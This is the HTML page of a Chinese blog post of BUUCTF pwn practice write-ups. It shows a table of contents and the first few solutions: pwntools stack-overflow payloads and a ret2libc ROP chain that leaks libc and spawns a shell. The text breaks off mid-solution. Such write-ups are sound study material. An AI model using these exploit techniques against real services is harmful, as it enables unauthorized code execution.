<!doctype html><html lang=zh-cn dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=true><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=theme-color content="rgb(255,255,255)"><title>BUUCTF Pwn ç»ƒä¹ è®°å½• &#183; Lab on Mercury</title>
<meta name=title content="BUUCTF Pwn ç»ƒä¹ è®°å½• &#183; Lab on Mercury"><script type=text/javascript src=/js/appearance.min.022d0ebc3b46a335eb1c7ef79b7f2de143d7cd5156d433638592ef1ce5f8554e.js integrity="sha256-Ai0OvDtGozXrHH73m38t4UPXzVFW1DNjhZLvHOX4VU4="></script><link type=text/css rel=stylesheet href=/css/main.bundle.min.0cc88d860376b4ebb5a839f96b657fcc278e5d31a3e66dce89b994562abde23a.css integrity="sha256-DMiNhgN2tOu1qDn5a2V/zCeOXTGj5m3OibmUViq94jo="><script defer type=text/javascript id=script-bundle src=/js/main.bundle.min.5b9218820e6c6b9f04b4c5a03dffd0d57bc9189f511ee80ea74222de3a608e2f.js integrity="sha256-W5IYgg5sa58EtMWgPf/Q1XvJGJ9RHugOp0Ii3jpgji8=" data-copy=å¤åˆ¶ data-copied=å·²å¤åˆ¶></script><meta name=description content="
      
        ä»ä»Šå¤©èµ·ï¼Œæˆ‘ä¹Ÿæ˜¯ Pwn ğŸ• äº†ã€‚
      
    "><link rel=canonical href=https://blog.sigmerc.top/posts/buu-pwn/><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><meta property="og:title" content="BUUCTF Pwn ç»ƒä¹ è®°å½•"><meta property="og:description" content="ä»ä»Šå¤©èµ·ï¼Œæˆ‘ä¹Ÿæ˜¯ Pwn ğŸ• äº†ã€‚"><meta property="og:type" content="article"><meta property="og:url" content="https://blog.sigmerc.top/posts/buu-pwn/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2019-12-14T00:00:00+00:00"><meta property="article:modified_time" content="2023-12-23T16:24:21+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="BUUCTF Pwn ç»ƒä¹ è®°å½•"><meta name=twitter:description content="ä»ä»Šå¤©èµ·ï¼Œæˆ‘ä¹Ÿæ˜¯ Pwn ğŸ• äº†ã€‚"><script type=application/ld+json>{"@context":"https://schema.org","@type":"Article","articleSection":"Posts","name":"BUUCTF Pwn ç»ƒä¹ è®°å½•","headline":"BUUCTF Pwn ç»ƒä¹ è®°å½•","abstract":"\u003cp\u003eä»ä»Šå¤©èµ·ï¼Œæˆ‘ä¹Ÿæ˜¯ Pwn ğŸ• äº†ã€‚\u003c\/p\u003e","inLanguage":"zh-cn","url":"https:\/\/blog.sigmerc.top\/posts\/buu-pwn\/","author":{"@type":"Person","name":"Mercury"},"copyrightYear":"2019","dateCreated":"2019-12-14T00:00:00\u002b00:00","datePublished":"2019-12-14T00:00:00\u002b00:00","dateModified":"2023-12-23T16:24:21\u002b08:00","keywords":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"mainEntityOfPage":"true","wordCount":"4119"}</script><meta name=author content="Mercury"><link href=mailto:signormercurio@gmail.com rel=me><link href=https://github.com/SignorMercurio rel=me><link href=https://t.me/m9r_at_tG rel=me></head><body class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 sm:px-14 md:px-24 lg:px-32 dark:bg-neutral-800 dark:text-neutral"><div id=the-top class="absolute flex self-center"><a class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span>è·³åˆ°ä¸»è¦å†…å®¹</a></div><header class="py-6 font-semibold text-neutral-900 print:hidden sm:py-10 dark:text-neutral"><nav class="flex items-start justify-between sm:items-center"><div class="z-40 flex flex-row items-center"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" rel=me href=/>Lab on Mercury</a></div><label id=menu-button for=menu-controller class="block sm:hidden"><input type=checkbox id=menu-controller class=hidden><div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentcolor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></div><div id=menu-wrapper class="invisible fixed inset-0 z-30 m-auto h-full w-full cursor-default overflow-auto bg-neutral-100/50 opacity-0 backdrop-blur-sm transition-opacity dark:bg-neutral-900/50"><ul class="mx-auto flex w-full max-w-7xl list-none flex-col overflow-visible px-6 py-6 text-end sm:px-14 sm:py-10 sm:pt-10 md:px-24 lg:px-32"><li class=mb-1><span class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentcolor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></span></li><li class="group mb-1"><a href=/posts/ title=Posts onclick=close_menu()><span class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2">Posts</span></a></li><li class="group mb-1"><a href=/categories/ title=Categories onclick=close_menu()><span class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2">Categories</span></a></li><li class="group mb-1"><a href=/tags/ title=Tags onclick=close_menu()><span class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2">Tags</span></a></li><li class="group mb-1"><a href=https://github.com/SignorMercurio/SignorMercurio.github.io title onclick=close_menu() target=_blank><span class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentcolor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></span></a></li><li class="group mb-1"><button id=search-button-1 title="æœç´¢ (/)">
<span class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"><span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span></span><span class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"></span></button></li></ul></div></label><ul class="hidden list-none flex-row text-end sm:flex"><li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0"><a href=/posts/ title=Posts><span class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2">Posts</span></a></li><li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0"><a href=/categories/ title=Categories><span class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2">Categories</span></a></li><li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0"><a href=/tags/ title=Tags><span class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2">Tags</span></a></li><li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0"><a href=https://github.com/SignorMercurio/SignorMercurio.github.io title target=_blank><span class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentcolor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></span></a></li><li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0"><button id=search-button-2 title="æœç´¢ (/)">
<span class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"><span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span></span><span class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"></span></button></li></ul></nav></header><div class="relative flex grow flex-col"><main id=main-content class=grow><article><header class=max-w-prose><ol class="text-sm text-neutral-500 print:hidden dark:text-neutral-400"><li class="hidden inline"><a class="dark:underline-neutral-600 decoration-neutral-300 hover:underline" href=/>Lab on Mercury</a><span class="px-1 text-primary-500">/</span></li><li class=inline><a class="dark:underline-neutral-600 decoration-neutral-300 hover:underline" href=/posts/>Posts</a><span class="px-1 text-primary-500">/</span></li><li class="hidden inline"><a class="dark:underline-neutral-600 decoration-neutral-300 hover:underline" href=/posts/buu-pwn/>BUUCTF Pwn ç»ƒä¹ è®°å½•</a><span class="px-1 text-primary-500">/</span></li></ol><h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">BUUCTF Pwn ç»ƒä¹ è®°å½•</h1><div class="mb-12 mt-8 text-base text-neutral-500 print:hidden dark:text-neutral-400"><div class="flex flex-row flex-wrap items-center"><time datetime="2019-12-14 00:00:00 +0000 UTC">2019-12-14</time><span class="px-2 text-primary-500">&#183;</span><time datetime="2023-12-23 16:24:21 +0800 +0800">æ›´æ–°äº 2023-12-23</time></div><div class="my-1 flex flex-wrap text-xs leading-relaxed text-neutral-500 dark:text-neutral-400"><a href=/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/ class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400">ç³»ç»Ÿå®‰å…¨</a>
<a href=/tags/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/ class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400">æ•´æ•°æº¢å‡º</a>
<a href=/tags/%E6%A0%88%E6%BC%8F%E6%B4%9E/ class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400">æ ˆæ¼æ´</a>
<a href=/tags/fsb/ class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400">fsb</a>
<a href=/tags/%E5%A0%86%E6%BC%8F%E6%B4%9E/ class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400">å †æ¼æ´</a></div></div></header><section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row"><div class="order-first px-0 lg:order-last lg:max-w-xs lg:ps-8"><div class="toc pe-5 print:hidden lg:sticky lg:top-10"><details open class="mt-0 sideNav rounded-lg rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 lg:mt-3"><summary class="block sticky top-0 py-1 text-lg font-semibold cursor-pointer rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 text-neutral-800 dark:text-neutral-100 lg:hidden bg-neutral-100 dark:bg-neutral-700">ç›®å½•</summary><div class="py-2 pr-2 border-dotted ltr:border-l rtl:border-r rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 border-neutral-300 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#part-i>Part I</a><ul><li><a href=#test_your_nc>test_your_nc</a></li><li><a href=#rip>rip</a></li><li><a href=#warmup_csaw_2016>warmup_csaw_2016</a></li><li><a href=#pwn1_sctf_2016>pwn1_sctf_2016</a></li><li><a href=#ciscn_2019_c_1>ciscn_2019_c_1</a></li><li><a href=#ciscn_2019_n_1>ciscn_2019_n_1</a></li><li><a href=#ciscn_2019_en_2>ciscn_2019_en_2</a></li></ul></li><li><a href=#part-ii>Part II</a><ul><li><a href=#ogeek2019babyrop>[OGeek2019]babyrop</a></li><li><a href=#babyheap_0ctf_2017>babyheap_0ctf_2017</a></li><li><a href=#get_started_3dsctf_2016>get_started_3dsctf_2016</a></li><li><a href=#not_the_same_3dsctf_2016>not_the_same_3dsctf_2016</a></li><li><a href=#ç¬¬äº”ç©ºé—´-2019-å†³èµ›pwn5>[ç¬¬äº”ç©ºé—´ 2019 å†³èµ›]PWN5</a></li><li><a href=#ciscn_2019_n_8>ciscn_2019_n_8</a></li><li><a href=#babyfengshui_33c3_2016>babyfengshui_33c3_2016</a></li><li><a href=#ciscn_2019_s_3>ciscn_2019_s_3</a></li><li><a href=#harekazectf2019baby_rop>[HarekazeCTF2019]baby_rop</a></li><li><a href=#pwn2_sctf_2016>pwn2_sctf_2016</a></li><li><a href=#ez_pz_hackover_2016>ez_pz_hackover_2016</a></li><li><a href=#ciscn_2019_ne_5>ciscn_2019_ne_5</a></li><li><a href=#harekazectf2019baby_rop2>[HarekazeCTF2019]baby_rop2</a></li><li><a href=#ciscn_2019_n_5>ciscn_2019_n_5</a></li><li><a href=#ciscn_2019_final_3>ciscn_2019_final_3</a></li><li><a href=#ciscn_2019_es_2>ciscn_2019_es_2</a></li><li><a href=#roarctf_2019_easy_pwn>roarctf_2019_easy_pwn</a></li><li><a href=#ciscn_2019_n_3>ciscn_2019_n_3</a></li><li><a href=#hitcon2014_stkof>hitcon2014_stkof</a></li></ul></li><li><a href=#part-iii>Part III</a><ul><li><a href=#sleepyholder_hitcon_2016>sleepyHolder_hitcon_2016</a></li><li><a href=#secretholder_hitcon_2016>secretHolder_hitcon_2016</a></li><li><a href=#bcloud_bctf_2016>bcloud_bctf_2016</a></li><li><a href=#lctf2016_pwn200>lctf2016_pwn200</a></li><li><a href=#zctf2016_note2>zctf2016_note2</a></li><li><a href=#zctf2016_note3>zctf2016_note3</a></li><li><a href=#0ctf_2018_heapstorm2>0ctf_2018_heapstorm2</a></li><li><a href=#houseoforange_hitcon_2016>houseoforange_hitcon_2016</a></li><li><a href=#ciscn_2019_final_2>ciscn_2019_final_2</a></li><li><a href=#å¼ºç½‘æ¯_æ‹Ÿæ€_stkof>å¼ºç½‘æ¯_æ‹Ÿæ€_stkof</a></li><li><a href=#axb_2019_heap>axb_2019_heap</a></li></ul></li></ul></nav></div></details></div></div><div class="min-h-0 min-w-0 max-w-prose grow"><p>ä»ä»Šå¤©èµ·ï¼Œæˆ‘ä¹Ÿæ˜¯ Pwn ğŸ• äº†ã€‚</p><h2 id=part-i class="relative group">Part I <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#part-i aria-label=é”šç‚¹>#</a></span></h2><h3 id=test_your_nc class="relative group">test_your_nc <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#test_your_nc aria-label=é”šç‚¹>#</a></span></h3><p>nc ç›´æ¥è¿ï¼Œ<code>cat flag</code>ã€‚</p><h3 id=rip class="relative group">rip <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#rip aria-label=é”šç‚¹>#</a></span></h3><p>æ ˆæº¢å‡ºï¼Œå¯ç›´æ¥è¦†ç›–è¿”å›åœ°å€ï¼Œæ³¨æ„ 64 ä½ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0xf</span><span class=o>+</span><span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;fun&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=warmup_csaw_2016 class="relative group">warmup_csaw_2016 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#warmup_csaw_2016 aria-label=é”šç‚¹>#</a></span></h3><p>å’Œä¸Šé¢˜å…¶å®ä¸€æ ·ï¼Œç¨‹åºä¸­å­˜åœ¨åé—¨ï¼Œç›´æ¥è¿”å›è¿‡å»ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x40</span><span class=o>+</span><span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x40060d</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=pwn1_sctf_2016 class="relative group">pwn1_sctf_2016 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#pwn1_sctf_2016 aria-label=é”šç‚¹>#</a></span></h3><p>ç›´æ¥è¿è¡Œå‡ æ¬¡æˆ–è€…æºç å®¡è®¡å¯ä»¥å‘ç°æ˜¯å°†è¾“å…¥çš„ <code>I</code> æ›¿æ¢ä¸º <code>you</code>ï¼Œå…¶ä½™çš„å…¶å®å’Œä¸Šé¢ä¸€æ ·ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=s1>&#39;I&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x3c</span> <span class=o>//</span> <span class=mi>3</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>4</span><span class=o>+</span><span class=n>p32</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;get_flag&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=ciscn_2019_c_1 class="relative group">ciscn_2019_c_1 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#ciscn_2019_c_1 aria-label=é”šç‚¹>#</a></span></h3><p>å¼€å¯äº† NX ä¿æŠ¤ï¼Œå¹¶ä¸”æœ‰æœªé™åˆ¶é•¿åº¦çš„ <code>gets</code>ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥ç¡®å®šæ˜¯ ROP æ ˆæº¢å‡ºã€‚IDA æœä¸€ä¸‹ stringï¼Œå¯ä»¥å‘ç°æœ‰ libc å¯ä»¥ç”¨ï¼Œè€ƒè™‘ ret2libcã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>pop_rdi</span> <span class=o>=</span> <span class=mh>0x400c83</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>send</span><span class=p>(</span><span class=n>payload</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ru</span><span class=p>(</span><span class=s1>&#39;ed</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sl</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x58</span><span class=p>,</span><span class=n>pop_rdi</span><span class=p>,</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;__libc_start_main&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>],</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s1>&#39;main&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ru</span><span class=p>(</span><span class=s1>&#39;@</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak</span> <span class=o>=</span> <span class=n>uu64</span><span class=p>(</span><span class=n>r</span><span class=p>(</span><span class=mi>6</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>system</span><span class=p>,</span><span class=n>binsh</span> <span class=o>=</span> <span class=n>ret2libc</span><span class=p>(</span><span class=n>leak</span><span class=p>,</span><span class=s1>&#39;__libc_start_main&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>flat</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x58</span><span class=p>,</span><span class=n>pop_rdi</span><span class=p>,</span><span class=n>binsh</span><span class=p>,</span><span class=n>system</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span></code></pre></div><h3 id=ciscn_2019_n_1 class="relative group">ciscn_2019_n_1 <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#ciscn_2019_n_1 aria-label=é”šç‚¹>#</a></span></h3><p>ä¾ç„¶æ˜¯æœ€ç®€å•çš„æ— ä¿æŠ¤ <code>gets</code> å¹¶ä¸”ç¨‹åºä¸­æœ‰ <code>system("cat /flag")</code>ï¼Œæ‰¾åˆ°åè€…åœ°å€è¿”å›è¿‡å»å³å¯ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>cat_flag</span> <span class=o>=</span> <span class=mh>0x4006be</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>send</span><span class=p>(</span><span class=n>payload</span><span class=p>):</span>
